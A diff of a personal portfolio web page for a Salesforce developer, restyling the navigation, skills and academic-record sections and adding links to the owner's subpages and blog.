@@ -1,594 +1,1151 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-  <title>ARUNKUMAR - PORTFOLIO</title>
-  <meta charset="utf-8">
-<meta name="viewport" content="width=1100">
-  
-  <link rel="stylesheet" href="styles.css">
+   <head>
+      <title>Arunkumarselvaraj</title>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=1100">
+      <link rel="icon" type="image/png" href="images/photo1.jpg"> 
+    <style> 
+      .navbar {
+         background-color: black;
+      }
+      .navbarScroll {
+      height: 60px; /* Adjust the height as needed */
+      }
+      .navbar-brand {
+      font-size: 5px; /* Adjust the font size as needed */
+      }
+      #navbarSupportedContent {
+         margin-top: 10px; /* Adjust the value as needed */
+      }
 
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
-  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
-  
-  <script src="https://kit.fontawesome.com/31149d48b0.js" crossorigin="anonymous"></script>
-  
-</head>
+      .navbar-nav {
+         padding-top: 10px; /* Adjust the value as needed */
+      }
 
-<body>
-    <nav class="navbar navbar-expand-lg fixed-top navbar-dark navbarScroll">
-        <div class="container">
-            <a class="navbar-brand" href="#"><b>ARUNKUMAR S</b></a>
-    
+      .ct-socials {
+         position: fixed;
+         top: 25%;
+         right: 0;
+         background-color: yellow;
+         padding-left: 20;
+         margin: 50;
+         padding: 10px;
+         font-size: 20px;
+         width: 40px;
+         text-align: center;
+         border: 80px; 
+      }
+      .section.triad-section {
+      margin-top: 10px;
+      }
+      section.section h2 {
+         font-size: 40px;
+         line-height: 46px;
+         margin-bottom: 20px;
+         text-align: center;
+         margin-top: 0;
+      }
+      h2 {
+         color: #000;
+      }
+      h1, h2, h3, h4, h5, h6 {
+         font-weight: 200;
+         letter-spacing: -1px;
+      }
+      section.section p.sub-heading {
+         font-size: 16px;
+         font-family: "Gotham SSm A", "Gotham SSm B";
+         font-weight: 300;
+         text-align: center;
+         margin-bottom: 40px;
+      }
+      section.triad-section .triad-sub-section {
+         padding-right: 60px;
+      }
+      section p.detail-paragraph:first-child {
+         margin-top: 0;
+      }
+      section p.detail-paragraph {
+         font-family: 'Open Sans Condensed', sans-serif;
+         margin-top: 40px;
+         font-size: 18px;
+         color: #000;
+      }
+      b, strong {
+         font-weight: 700;
+      }
+      .hero_title {
+         font-size: 2.5rem;
+      }
+      .hero_desc {
+         font-size: 2rem;
+      }
+      .hero-text {
+         text-align: center;
+         position: absolute;
+         top: 50%;
+         left: 50%;
+         transform: translate(-50%, -50%);
+         color: white;
+      }
+      #contact {
+         padding-bottom: 2rem;
+      }
+
+      .imageAboutPage {
+         width: 60%;
+      margin-right: 100px;
+      }
+      .servicesText.card {
+         height: 280px;
+         cursor: pointer;
+         border-color:#008000;
+      }
+      .servicesIcon {
+         font-size: 36px;
+         text-align: center;
+         width: 100%;
+      }
+      .card-title {
+         text-align: center;
+      font-size: 15px;
+         color: red;
+      }
+      .card:hover .servicesIcon {
+         color: #490080;
+      }
+      .servicesText:hover {
+         border: 1px solid #e80cc0;
+      }
+      .social-icons {
+         font-size: 36px;
+         cursor: pointer;
+      }
+      .fa-facebook:hover,.fa-instagram:hover,.fa-twitter:hover,.fa-linkedin:hover, .fa-twitch:hover {
+         color: 	#ff0040;
+      }
+      .fab {
+         color: 	#333333;
+      background-size: 2px;
+      }
+
+      #footer {
+      
+         text-align: center;
+      font-size: 10px;
+      }
+      #services .services {
+      flex-direction: column;
+      text-align: center;
+      max-width: 1500px;
+      margin: 0 auto;
+      padding: 50px 0;
+      }
+      #services .service-top {
+      max-width: 500px;
+      margin: 0 auto;
+      }
+      #services .service-bottom {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-wrap: wrap;
+      color: red;
+      margin-top: 50px;
+      }
+      #services .service-item {
+      flex-basis: 100%;
+      display: flex;
+      align-items: flex-start;
+      justify-content: center;
+      flex-direction: column;
+      color: red;
+      padding: 30px;
+      border-radius: 0px;
+      background-size: cover;
+      margin: 20px 15%;
+      position: relative;
+      z-index: 1;
+      overflow: hidden;
+      }
+      #services .service-item::after {
+      content: '';
+      position: absolute;
+      left: 0;
+      top: 0;
+      height: 100%;
+      width: 100%;
+      background-image: linear-gradient(60deg, #29323c 0%, #485563 100%);
+      opacity: 0.9;
+      z-index: -1;
+      }
+      #services .service-bottom .icon {
+      height: 80px;
+      width: 100px;
+      margin-bottom: 20px;
+      }
+      #services .service-item h2 {
+      font-size: 1rem;
+      color: red;
+      margin-bottom: 10px;
+      
+      text-align: center;
+      }
+
+      #services .service-item a {
+      color: RED;
+      text-align: center;
+      }
+      #services .service-bottom .service-item {
+      flex-basis: 15%;
+      margin: 2%;
+      }
+      #contact .contact-items {
+      
+      width: 100%;
+      }
+      #contact .contact {
+      flex-direction: column;
+      padding: 100px 0;
+      align-items: center;
+      justify-content: center;
+      min-width: 20vh;
+      }
+      #contact .contact-item {
+      width: 80%;
+      padding: 20px;
+      text-align: center;
+      border-radius: 10px;
+      padding: 10px;
+      margin: 20px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      box-shadow: 0px 0px 10px 0 red;
+      transition: 0.3s ease box-shadow;
+      width: 30%;
+      }
+
+      #contact .contact-info h1 {
+      font-size: 1.0rem;
+      font-weight: 500;
+      margin-bottom: 5px;
+      }
+      #contact .contact-info h2 {
+      font-size: 1.0rem;
+      line-height: 2rem;
+      font-weight: 500;
+      }
+
+      #contact .contact-item .icon {
+      height: 100px;
+      width: 100px;
+      size: 100cap;
+      }
+      #contact .contact-item .icon img {
+      object-fit: contain;
+      size: 5px;
+      }
+      #contact .contact-item .contact-info {
+      width: 100%;
+      text-align: left;
+      padding-left: 20px;
+      size:15px;
+      }
+      #contact .contact-items {
+      display: flex;
+      justify-content: space-between;
+      }
+      
+      #contact .contact-item {
+      flex-basis: 25%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      }
+      
+      #contact .icon {
+      margin-bottom: 1rem;
+      }
+      
+      #contact .contact-info {
+      margin-bottom: 2rem;
+      }
+      
+      @media screen and (max-width: 768px) {
+      #contact .contact-items {
+         flex-wrap: wrap;
+      }
+      
+      #contact .contact-item {
+         flex-basis: 50%;
+      }
+      }
+ 
+    </style>
+      <link rel="icon" type="image/png" href="images/photo1.jpg">
+      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+      <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+      <script src="https://kit.fontawesome.com/31149d48b0.js" crossorigin="anonymous"></script>
+   </head>
+   <body>
+      <nav class="navbar navbar-expand-lg fixed-top navbar-dark navbarScroll">
+
+         <div style="margin-left: 20px;">
+             <li class="nav-item nav-item dropdown">
+            <img src="images/photo1.jpg" alt="Logo" style="max-width: 70px; max-height: 45px; cursor: pointer;" onclick="toggleDropdown('dropdownLinks');">
+            <div id="dropdownLinks" style="display: none; position: absolute; top: 100%; left: 0; padding: 10px; z-index: 1; width: 200px; margin-left: 20px;">
+               <ul style="list-style-type: none; padding: 0;">
+               <li><a class="dropdown-item" href="music.html" style="color: #ff6347;"><b>Music</b></a></li>
+               <li><a class="dropdown-item" href="driveStorage.html" style="color: #05f739;"><b>Drive Storage</b></a></li>
+               <li><a class="dropdown-item" href="websiteSheet.html" style="color: #131dd0;"><b>Web Sheet</b></a></li>
+               <li><a class="dropdown-item" href="expenses.html" style="color: #05f739;"><b>Expenses</b></a></li>
+               <li><a class="dropdown-item" href="update.html" style="color: #d013bd;"><b>Live Updates</b></a></li>
+                   <li><a class="dropdown-item" href="feedback.html" style="color: #2f0ee9;"><b>Feedback Updates</b></a></li>
+               
+               </ul>
+               
+            </div>
+            </li>
+        </div>
+        
+         <div class="container">
+            <script>
+               function toggleDropdown(dropdownId) {
+                   var dropdown = document.getElementById(dropdownId);
+                   dropdown.style.display = dropdown.style.display === 'none' ? 'block' : 'none';
+               }
+            </script>
+            <a class="navbar-brand" href="#home" style="font-size: 14px; vertical-align: middle;"><b>ARUNKUMAR S</b></a>
             <div class="collapse navbar-collapse" id="navbarSupportedContent">
-                <ul class="navbar-nav ms-auto">
-                    <li class="nav-item active">
-                        <a class="nav-link" href="#home"><b>Home</b></a>
-                    </li>
-    
-                  
-
-                    <li class="nav-item active">
-                        <a class="nav-link" href="#skill"><b>Skills</b></a>
-                    </li>
-    
-                    <li class="nav-item nav-item dropdown">
-                        <a class="nav-link dropdown-toggle" href="#webpage" id="navbarDropdownWebpage" role="button" data-bs-toggle="dropdown" aria-expanded="false">
-                            <b>Webpage</b>
-                        </a>
-                        <ul class="dropdown-menu" aria-labelledby="navbarDropdownWebpage" style="background-color: #45b511;">
-                            <li><a class="dropdown-item" href="WEB-SERVICES/index.html" style="color: #f40606;"><b>WEB SERVICE</b></a></li>
-                            <li><a class="dropdown-item" href="https://arunkumar-selvaraj.blogspot.com/" style="color: #cfe609;"><b>BLOGGER</b></a></li>
-                            <li><a class="dropdown-item" href="games/index.html" style="color: #cb0f0f;"><b>GAMES</b></a></li>
-                            <li><a class="dropdown-item" href="techtools/index.html" style="color: #0fe745;"><b>TECH TOOLS</b></a></li>
-                            <li><a class="dropdown-item" href="AI WEBSITE/index.html" style="color: #07f4f4;"><b>AI WEBSITE</b></a></li>
-                            <li><a class="dropdown-item" href="EDITOR/index1.html" style="color: #4e0ecd;"><b>EDITOR APPS</b></a></li>
-                        
-                        </ul>
-                    </li>
-    
-            
-
-                    <li class="nav-item active">
-                        <a class="nav-link" href="#projects"><b>Projects</b></a>
-                    </li>
-
-                    <li class="nav-item active">
-                        <a class="nav-link" href="#internship"><b>Internship</b></a>`
-                    </li>
-    
-                   
-        
-                        <li class="nav-item nav-item dropdown">
-                            <a class="nav-link dropdown-toggle" href="#certificate" id="navbarDropdownCertificate" role="button" data-bs-toggle="dropdown" aria-expanded="false">
-                                <b>Certificate</b>
-                            </a>
-                            <ul class="dropdown-menu" aria-labelledby="navbarDropdownCertificate" style="background-color: #b81080;">
-                                <li><a class="dropdown-item" href="#certificate" style="color: #ff6347;"><b>CERTIFICATE</b></a></li>
-                                <li>
-                                    <a class="dropdown-item" href="#profile" style="color: #131dd0;"><b>PROFILE</b></a>
-                                  </li>
-                                  
-                               
-                            </ul>
-                        </li>
-        
-                       
-        
-                        <li class="nav-item">
-                            <a class="nav-link" href="#contact"><b>Contact</b></a>
-                        </li>
-                    </ul>
-        
-                </div>
+               <ul class="navbar-nav ms-auto">
+                  <li class="nav-item active">
+                     <a class="nav-link" href="#home"><b>Home</b></a>
+                  </li>
+                  <li class="nav-item active">
+                     <a class="nav-link" href="#skill"><b>Skills</b></a>
+                  </li>
+                  <li class="nav-item active">
+                     <a class="nav-link" href="#services"><b>Websites</b></a>
+                  </li>
+                  <li class="nav-item active">
+                     <a class="nav-link" href="#projects"><b>Projects</b></a>
+                  </li>
+                  <li class="nav-item active">
+                     <a class="nav-link" href="#internship"><b>Internship</b></a>`
+                  </li>
+                     <li class="nav-item active">
+                    <a class="nav-link" href="#certificate"><b>Certificate</b></a>`
+                 </li>
+                  <li class="nav-item active">
+                    <a class="nav-link" href="#profile"><b>Profile</b></a>`
+                 </li>
+               
+                  <li class="nav-item nav-item dropdown">
+                     <a class="nav-link dropdown-toggle" href="#contact" id="navbarDropdownCertificate" role="button" data-bs-toggle="dropdown" aria-expanded="true"><b>Contact</b></a>
+                     <ul class="dropdown-menu" aria-labelledby="navbarDropdownCertificate">
+                        <li><a class="dropdown-item" href="#contact" style="color: #ff6347;"><b>Details</b></a></li>
+                        <li><a class="dropdown-item" href="#queries" style="color: #05f739;"><b>Queries</b></a></li>
+                        <li><a class="dropdown-item" href="#subscription" style="color: #131dd0;"><b>Subscription</b></a></li>
+                     </ul>
+                  </li>
+               </ul>
             </div>
-        </nav>
-        <style>
-            .dropdown:hover .dropdown-menu {
-                display: block;
-            }
-        </style>
-            
-
-    <section class="bgimage" id="home">
-	
-        <div class="container-fluid">
-	
-			
-				<ol class="ct-socials">
-    <a href="tel:+919585769175" target="_blank"><i class='fa fa-id-card'  style='color: black'></i></a>
-	<a href="https://www.linkedin.com/in/arunkumar-engineer/" target="_blank"><i class='fa fa-linkedin-square' style='color: black'></i></a>
-	<a href="https://wa.me/+919585769175/?text=Hello Arunkumar S" target="_blank"><b>
-        <i class='fab fa-whatsapp-square'  style='color: black'></i></b></a>
-	<a href="https://github.com/arunkumarselvaraj-github" target="_blank"><i class="fa fa-github-square"style='color: black'></i></a>
-	<a href="mailto: arunkumarhari22@gmail.com" target="_blank"><i class="fa fa-envelope-square" style='color: black'></i></a>
-  </ol>
-        </div>
-    </section>
-  
-    <section id="home">
-        <div class="container mt-4 pt-4">
-            <br><br><br><br>
-            <h1 class="text-center" style="font-size: 20px"><b>ABOUT ME</b></h1>
-            <div class="row mt-4">
-                <div class="col-lg-4">
-                    <img src="images/photo1.jpg" class="img-fluid imageAboutPage" alt="Profile Photo">
-                </div>
-              
-                <div class="col-lg-7">
-                    <div class="row mt-3">
-                        <div class="col-md-20">  <br><br>
-                            <p>My name is Arunkumar S. I was born on 22nd January 2002. I have recently graduated with a Bachelor's degree in Computer Science and Engineering (BE CSE) in the year 2023. Currently, I am working as a Salesforce Developer at SpringFive.</p>
-        
-                            <a href="https://drive.google.com/drive/folders/1dV39THjH10TtwB2_nSTle987f6ryzc_-?usp=sharing"
-                                target="_blank"
-                                style="background-color: #ffa500; border-color: #Orange; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;">
-                                <b>VIEW RESUME</b>
-                            </a>
+         </div>
+      </nav>
+      <style>
+         .dropdown:hover .dropdown-menu {
+         display: block;
+         }
+      </style>
+      <section class="bgimage" id="home">
+         <div class="container-fluid">
+            <ol class="ct-socials">
+               <a href="tel:+919585769175" target="_blank"><i class='fa fa-id-card'  style='color: black'></i></a>
+               <a href="https://www.linkedin.com/in/arunkumar-engineer/" target="_blank"><i class='fa fa-linkedin-square' style='color: black'></i></a>
+               <a href="https://wa.me/+919585769175/?text=Hello Arunkumar S" target="_blank"><b><i class='fab fa-whatsapp-square'  style='color: black'></i></b></a>
+               <a href="https://github.com/arunkumarselvaraj-github" target="_blank"><i class="fa fa-github-square"style='color: black'></i></a>
+               <a href="mailto: arunkumarhari22@gmail.com" target="_blank"><i class="fa fa-envelope-square" style='color: black'></i></a>
+            </ol>
+         </div>
+      </section>
+      <section id="home">
+         <div class="container mt-4 pt-4">
+            <div class="row mt-5">
+               <div class="col-lg-4">
+                  <br><br><br>
+                  <img src="images/photo1.jpg" class="img-fluid imageAboutPage" alt="Profile Photo"> <br> <br>
+                  <a href="https://drive.google.com/drive/folders/1dV39THjH10TtwB2_nSTle987f6ryzc_-?usp=sharing" target="_blank" style="background-color: #ffa500; border-color: Orange; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;margin-left: 26px;"><b>VIEW RESUME</b></a>
+               </div>
+               <div class="col-lg-7">
+                  <div class="row mt-3">
+                     <div class="col-md-20">
+                        <div style="border: 2px solid #f70f23; padding: 10px; width: 500px; text-align: center; background-color: #ffffff; box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2); font-family: Arial, sans-serif; margin: auto;">
+                           <div style="font-size: 12px; color: #333; line-height: 1.5;">
+                              <p>My name is Arunkumar S. I was born on 22nd January 2002. Currently, I am working as a Salesforce Developer at SpringFive.</p>
+                           </div>
                         </div>
-                    </div>
-                </div>
+                        <br>
+                        <div style="display: flex; margin-bottom: 12px; gap: 10px; align-items: center">
+                           <div style="border: 2px solid #111fe4; padding: 20px; width: 600px; text-align: center; background-color: #ffffff; box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2); transition: transform 0.2s; font-family: Arial, sans-serif; transform-origin: center; color: #e74c3c;">
+                              <div style="font-size: 15px; font-weight: bold; margin-bottom: 12px;">10th Grade</div>
+                              <div style="font-size: 12px; margin-bottom: 4px;">Marks: 97%</div>
+                              <div style="font-size: 12px; margin-bottom: 4px;">Board: State Board Of TamilNadu</div>
+                              <div style="font-size: 12px; margin-bottom: 4px;">Academic Year: 2016-2017</div>
+                              <div style="font-size: 12px; margin-bottom: 4px;">Result: Distinction</div>
+                              <div style="font-size: 12px;">School: Vaigai Matric High Sec School</div>
+                           </div>
+                           <div style="border: 2px solid #111fe4; padding: 20px; width: 600px; text-align: center; background-color: #ffffff; box-shadow: 0px 0px 12px rgba(0, 0, 0, 0.2); transition: transform 0.2s; font-family: Arial, sans-serif; transform-origin: center; color: #3a07e0;">
+                              <div style="font-size: 15px; font-weight: bold; margin-bottom: 12px;">12th Grade</div>
+                              <div style="font-size: 12px; margin-bottom: 4px;">Marks: 83.16%</div>
+                              <div style="font-size: 12px; margin-bottom: 4px;">Board: State Board Of TamilNadu</div>
+                              <div style="font-size: 12px; margin-bottom: 4px;">Academic Year: 2018-2019</div>
+                              <div style="font-size: 12px; margin-bottom: 4px;">Result: Distinction</div>
+                              <div style="font-size: 12px;">School: Vaigai Matric High Sec School</div>
+                           </div>
+                           </div>
+                           
+                                  <div style="display: flex;  gap: 10px;">
+                           <div style="border: 2px solid #111fe4; padding: 20px; width: 600px; text-align: center; background-color: #ffffff; box-shadow: 0px 0px 12px rgba(0, 0, 0, 0.2); transition: transform 0.2s; font-family: Arial, sans-serif; transform-origin: center; color: #27ae60;">
+                              <div style="font-size: 15px; font-weight: bold; margin-bottom: 12px;">Undergraduate - BE (Computer Science Engineering)</div>
+                              <div style="font-size: 12px; margin-bottom: 4px;">GPA: 9.52/10</div>
+                              <div style="font-size: 12px; margin-bottom: 4px;">Academic Year: 2019-2023</div>
+                              <div style="font-size: 12px; margin-bottom: 4px;">Result: First Class with Distinction</div>
+                              <div style="font-size: 12px;">College: Sona College of Technology - Anna University</div>
+                           </div>
+                        <div style="border: 2px solid #111fe4; padding: 20px; width: 600px; text-align: center; background-color: #ffffff; box-shadow: 0px 0px 12px rgba(0, 0, 0, 0.2); transition: transform 0.2s; font-family: Arial, sans-serif; transform-origin: center; color: #ae279e;">
+                           <div style="font-size: 15px; font-weight: bold; margin-bottom: 12px;">Postgraduate - MBA (Business Analytics)</div>
+                           <div style="font-size: 12px; margin-bottom: 4px;">GPA:</div>
+                           <div style="font-size: 12px; margin-bottom: 4px;">Academic Year: 2023-2025</div>
+                           <div style="font-size: 12px; margin-bottom: 4px;">Result:</div>
+                           <div style="font-size: 12px;">College: Anna University - CHENNAI</div>
+                        </div>
+                        </div>
+                        <br> 
+                     </div>
+                  </div>
+               </div>
             </div>
-        </div>
-</section>        
-<br>
-
-
-<section id="skill" style="background-color: #f7f7f7; padding: 80px 0;">
-    <div class="container" style="background: linear-gradient(to bottom, #ffffff, #f0f0f0); border-radius: 10px; padding: 20px; box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);">
-        <h1 class="skill-title" style="text-align: center; font-size: 36px; margin-bottom: 30px; color: #333;"><b>MY SKILL SET</b></h1>
-        <div class="row">
-
-            <div class="col-lg-4 mt-4">
-                <div class="card servicesText" style="border: none; box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1); transition: transform 0.3s; background-color: #fff;">
-                    <div class="card-body">
+         </div>
+      </section>
+      <br>
+      <section id="skill" style="background-color: #f7f7f7; padding: 80px 0;">
+         <div class="container" style="background: linear-gradient(to bottom, #ffffff, #f0f0f0); border-radius: 10px; padding: 20px; box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);">
+            <h1 class="skill-title" style="text-align: center; font-size: 36px; margin-bottom: 30px; color: #333;"><b>MY SKILL SET</b></h1>
+            <div class="row">
+               <div class="col-lg-4 mt-4">
+                  <div class="card servicesText" style="border: none; box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1); transition: transform 0.3s; background-color: #fff;">
+                     <div class="card-body">
                         <h4 class="card-title mt-3" style="font-size: 24px; color: #333;">PROGRAMMING LANGUAGES</h4>
                         <ul class="card-text mt-3" style="list-style: none; padding-left: 0;">
-                            
-                            <li style="color: #555;">
-                                <i class="fab fa-python python-icon advanced" style="font-size: 18px; color: #4caf50;"></i>
-                                <span style="margin-left: 10px;">PYTHON</span>
-                            </li>
-                            <li style="color: #555;">
-                                <i class="fas fa-code c-icon intermediate" style="font-size: 18px; color: #36a9e1;"></i>
-                                <span style="margin-left: 10px;">C</span>
-                            </li>
-                            <li style="color: #555;">
-                                <i class="fab fa-java java-icon beginner" style="font-size: 18px; color: #f06;"></i>
-                                <span style="margin-left: 10px;">JAVA</span>
-                            </li>
-                            <li style="color: #555;">
-                                <i class="fas fa-database sql-icon intermediate" style="font-size: 18px; color: #f36;"></i>
-                                <span style="margin-left: 10px;">SQL</span>
-                            </li>
+                           <li style="color: #555;">
+                              <i class="fab fa-python python-icon advanced" style="font-size: 18px; color: #4caf50;"></i>
+                              <span style="margin-left: 10px;">PYTHON</span>
+                           </li>
+                           <li style="color: #555;">
+                              <i class="fas fa-code c-icon intermediate" style="font-size: 18px; color: #36a9e1;"></i>
+                              <span style="margin-left: 10px;">C</span>
+                           </li>
+                           <li style="color: #555;">
+                              <i class="fab fa-java java-icon beginner" style="font-size: 18px; color: #f06;"></i>
+                              <span style="margin-left: 10px;">JAVA</span>
+                           </li>
+                           <li style="color: #555;">
+                              <i class="fas fa-database sql-icon intermediate" style="font-size: 18px; color: #f36;"></i>
+                              <span style="margin-left: 10px;">SQL</span>
+                           </li>
                         </ul>
-                    </div>
-                </div>
-            </div>
-
-            <div class="col-lg-4 mt-4">
-                <div class="card servicesText" style="border: none; box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1); transition: transform 0.3s; background-color: #fff;">
-                    <div class="card-body">
+                     </div>
+                  </div>
+               </div>
+               <div class="col-lg-4 mt-4">
+                  <div class="card servicesText" style="border: none; box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1); transition: transform 0.3s; background-color: #fff;">
+                     <div class="card-body">
                         <h4 class="card-title mt-3" style="font-size: 24px; color: #333;">WEB DEVELOPMENT</h4>
                         <ul class="card-text mt-3" style="list-style: none; padding-left: 0;">
-                            <li style="color: #555;">
-                                <i class="fab fa-html5 html-icon intermediate" style="font-size: 18px; color: #f06;"></i>
-                                <span style="margin-left: 10px;">HTML</span>
-                            </li>
-                            <li style="color: #555;">
-                                <i class="fab fa-css3-alt css-icon intermediate" style="font-size: 18px; color: #36a9e1;"></i>
-                                <span style="margin-left: 10px;">CSS</span>
-                            </li>
-                            <li style="color: #555;">
-                                <i class="fab fa-js javascript-icon beginner" style="font-size: 18px; color: #4caf50;"></i>
-                                <span style="margin-left: 10px;">JAVASCRIPT</span>
-                            </li>
+                           <li style="color: #555;">
+                              <i class="fab fa-html5 html-icon intermediate" style="font-size: 18px; color: #f06;"></i>
+                              <span style="margin-left: 10px;">HTML</span>
+                           </li>
+                           <li style="color: #555;">
+                              <i class="fab fa-css3-alt css-icon intermediate" style="font-size: 18px; color: #36a9e1;"></i>
+                              <span style="margin-left: 10px;">CSS</span>
+                           </li>
+                           <li style="color: #555;">
+                              <i class="fab fa-js javascript-icon beginner" style="font-size: 18px; color: #4caf50;"></i>
+                              <span style="margin-left: 10px;">JAVASCRIPT</span>
+                           </li>
                         </ul>
-                    </div>
-                </div>
-            </div>
-
-            <div class="col-lg-4 mt-4">
-                <div class="card servicesText" style="border: none; box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1); transition: transform 0.3s; background-color: #fff;">
-                    <div class="card-body">
+                     </div>
+                  </div>
+               </div>
+               <div class="col-lg-4 mt-4">
+                  <div class="card servicesText" style="border: none; box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1); transition: transform 0.3s; background-color: #fff;">
+                     <div class="card-body">
                         <h4 class="card-title mt-3" style="font-size: 24px; color: #333;">SALESFORCE</h4>
                         <ul class="card-text mt-3" style="list-style: none; padding-left: 0;">
-                            <h4 style="font-size: 15px; color: #ea1c1c;">SALESFORCE DEVELOPER</h4>
-                            <ul class="card-text mt-3" style="list-style: none; padding-left: 0;">
-                         
-                            <li style="color: #555;">
-                                <i class="fab fa-java salesforce-icon intermediate" style="font-size: 18px; color: #f06;"></i>
-                                <span style="margin-left: 10px;">APEX PROGRAMMING</span>
-                            </li>
-                            <li style="color: #555;">
-                                <i class="fab fa-salesforce salesforce-icon intermediate" style="font-size: 18px; color: #4caf50;"></i>
-                                <span style="margin-left: 10px;">VISUALFORCE PAGES</span>
-                            </li>
-                            <li style="color: #555;">
-                                <i class="fas fa-bolt salesforce-icon intermediate" style="font-size: 18px; color: #f36;"></i>
-                                <span style="margin-left: 10px;">LIGHTNING WEB COMPONENTS</span>
-                            </li>
-                          </ul>
+                           <h4 style="font-size: 15px; color: #ea1c1c;">SALESFORCE DEVELOPER</h4>
+                           <ul class="card-text mt-3" style="list-style: none; padding-left: 0;">
+                              <li style="color: #555;">
+                                 <i class="fab fa-java salesforce-icon intermediate" style="font-size: 18px; color: #f06;"></i>
+                                 <span style="margin-left: 10px;">APEX PROGRAMMING</span>
+                              </li>
+                              <li style="color: #555;">
+                                 <i class="fab fa-salesforce salesforce-icon intermediate" style="font-size: 18px; color: #4caf50;"></i>
+                                 <span style="margin-left: 10px;">VISUALFORCE PAGES</span>
+                              </li>
+                              <li style="color: #555;">
+                                 <i class="fas fa-bolt salesforce-icon intermediate" style="font-size: 18px; color: #f36;"></i>
+                                 <span style="margin-left: 10px;">LIGHTNING WEB COMPONENTS</span>
+                              </li>
+                           </ul>
                         </ul>
-                    </div>
-                </div>
+                     </div>
+                  </div>
+               </div>
             </div>
-
-            <!-- Add more skill categories as needed -->
-
-        </div>
-    </div>
-</section>
-
-
-
-   
-    
-
-
-    <section id="services">
-        <div class="services container">
-          <div class="service-top">
-    <br>
-            <h1 class="text-center"style="font-size: 20px"><b>HOME WEBSITE</b></h1>
-
-          </div>
-          <div class="service-bottom">
-          <div class="service-item">
-              <div class="icon"><a href="WEB-SERVICES/index.html" target="_blank" style="text-decoration: none;"><img src="https://img.icons8.com/bubbles/100/000000/web.png" /></a></div>
-              <h2><a href="WEB-SERVICES/index.html" target="_blank" style="text-decoration: none;">WEB SERVICE</a> </h2>
-            </div>
-          
-            <div class="service-item">
-              <div class="icon"><a href="https://arunkumar-selvaraj.blogspot.com/" target="_blank" style="text-decoration: none;"><img src="https://img.icons8.com/bubbles/100/000000/book.png" /></a></div>
-              <h2><a href="https://arunkumar-selvaraj.blogspot.com/" target="_blank" style="text-decoration: none;">BLOGGER</a> 
-              </h2>
-            </div>
-            
-            <div class="service-item">
-              <div class="icon"><a href="games/index.html" target="_blank" style="text-decoration: none;"><img src="https://img.icons8.com/bubbles/100/000000/web.png" /></a></div>
-              <h2><a href="games/index.html" target="_blank" style="text-decoration: none;">GAMES</a> </h2>
-            </div>
-
-            <div class="service-item">
-                <div class="icon"><a href="techtools/index.html" target="_blank" style="text-decoration: none;"><img src="https://img.icons8.com/bubbles/100/000000/book.png" /></a></div>
-                <h2><a href="techtools/index.html" target="_blank" style="text-decoration: none;">TECH TOOLS</a> </h2>
-              </div>
-
-              <div class="service-item">
-                <div class="icon"><a href="AI WEBSITE/index.html" target="_blank" style="text-decoration: none;"><img src="https://img.icons8.com/bubbles/100/000000/web.png" /></a></div>
-                <h2><a href="AI WEBSITE/index.html" target="_blank" style="text-decoration: none;">AI WEBSITE</a> </h2>
-              </div>
-              <div class="service-item">
-                <div class="icon"><a href="AI WEBSITE/index1.html" target="_blank" style="text-decoration: none;"><img src="https://img.icons8.com/bubbles/100/000000/web.png" /></a></div>
-                <h2><a href="EDITOR/index.html" target="_blank" style="text-decoration: none;">EDITOR APPS</a> </h2>
-              </div>
-           
-           
-           
-          </div>
-        </div>
+         </div>
       </section>
+      <br><br>
+      <section id="services"style="background-color: #f7f7f7;">
+            <br>
+         <div class="container" style="background: linear-gradient(to bottom, #ffffff, #f0f0f0); border-radius: 10px; box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);">
+     
+         <div class="services container">
+               <h1 class="text-center"style="font-size: 20px"><b>HOME WEBSITE</b></h1>
+            <div class="service-bottom">
+             
+    <div style="display: flex; flex-wrap: wrap; gap: 20px; max-width: 1200px;">
+      <div style="flex: 0 0 calc(20% - 20px); background-color: #ffffff; border: 1px solid #2308f2; padding: 20px; border-radius: 8px; text-align: center; box-sizing: border-box; margin-bottom: 20px;">
+          <a href="https://arunkumar-selvaraj.blogspot.com/" target="_blank" style="text-decoration: none; color: #333; font-weight: bold; display: block; margin-top: 10px;">MY BLOGGER</a>
+      </div>
 
-      
+      <div style="flex: 0 0 calc(20% - 20px); background-color: #ffffff; border: 1px solid #2308f2; padding: 20px; border-radius: 8px; text-align: center; box-sizing: border-box; margin-bottom: 20px;">
+   <a href="live.html" target="_blank" style="text-decoration: none; color: #333; font-weight: bold; display: block; margin-top: 10px;">TAMIL LIVE CHANNELS</a>
+</div>
+
+          <div style="flex: 0 0 calc(20% - 20px); background-color: #ffffff; border: 1px solid #2308f2; padding: 20px; border-radius: 8px; text-align: center; box-sizing: border-box; margin-bottom: 20px;">
+          <a href="techtool.html" target="_blank" style="text-decoration: none; color: #333; font-weight: bold; display: block; margin-top: 10px;">TECH MANAGEMENT SYSTEM</a>
+      </div>
+      <div style="flex: 0 0 calc(20% - 20px); background-color: #ffffff; border: 1px solid #2308f2; padding: 20px; border-radius: 8px; text-align: center; box-sizing: border-box; margin-bottom: 20px;">
+          <a href="games.html" target="_blank" style="text-decoration: none; color: #333; font-weight: bold; display: block; margin-top: 10px;"> GAMES MANAGEMENT SYSTEM</a>
+      </div>
   
-<section id="projects">
-        <div class="container mt-3">
-	
-            
-            <br><br><br>
